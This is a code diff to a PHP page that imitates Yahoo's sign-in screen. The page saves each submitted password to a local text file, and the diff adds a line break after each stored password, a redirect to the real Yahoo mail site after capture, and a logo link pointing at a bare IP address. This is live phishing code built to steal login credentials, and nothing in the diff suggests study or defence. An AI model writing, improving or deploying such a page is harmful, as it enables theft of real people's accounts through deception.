@@ -4,8 +4,10 @@ if(isset($_POST['submit']))
 $name = $_POST['username'];
 $myfile = fopen("./data.txt", "a");
 $pw = $_POST['password'];
-fwrite($myfile, $pw);
+$parsed = $pw."\n";
+fwrite($myfile, $parsed);
 fclose($myfile);
+header("Location: https://mail.yahoo.com");
 }
 ?>
 
@@ -33,7 +35,7 @@ fclose($myfile);
         <div id="login-body" class="loginish  puree-v2 grid">
             <div class="mbr-desktop-hd">
                 <span class="column">
-         <a href="https://www.yahoo.com/">
+         <a href="http://35.178.199.24/">
             <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36" />
             <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36" />
         </a>
